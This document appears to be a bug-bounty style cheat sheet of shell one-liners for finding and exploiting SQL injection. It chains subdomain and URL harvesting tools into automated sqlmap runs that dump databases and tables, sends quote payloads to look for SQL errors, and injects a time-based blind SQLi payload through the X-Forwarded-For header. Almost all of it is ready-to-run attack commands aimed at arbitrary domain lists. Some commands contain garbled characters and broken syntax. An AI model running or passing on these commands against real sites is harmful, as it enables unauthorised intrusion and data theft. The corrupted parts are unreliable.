GHOST_3xP10iT
SQL Injection Some OneLiner
Installation Requirements
Subfinder :- https://github.com/projectdiscovery/subfinder
GAU :- https://github.com/lc/gau
GF - https://github.com/tomnomnom/gf
Findomain :- https://github.com/Findomain/Findomain
HTTPX :- https://github.com/projectdiscovery/httpx
Anew :- https://github.com/tomnomnom/anew
Waybackurls :- https://github.com/tomnomnom/waybackurls 
SQLiDetector:-  

OneLiner
$ echo http://testphp.vulnweb.com | waybackurls > wayback_urls_for_target.txt; python3 sqlidetector.py -f wayback_urls_for_target.txt

$ subfinder -d http://TARGET.com -silent -all | gau blacklist ttf, woff, svg, png sort -U | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt

$ findomain -t http://testphp.vulnweb.com -qâ˜ httpx -silent | anew | waybackurls | gf sqli >> sqli; sqlmap -m sqli --batch --random-agent --level 1

$ cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done


$  Header-Based Blind SQL injection cat domain.txt | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(), sleep (13),0))OR" -rt -timeout 20 -mrt '>13'


sqlmap -u "https://example,com/endpoint?id=1" -p id --dbs --tables --level 3


$ subfinder -dL domain.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt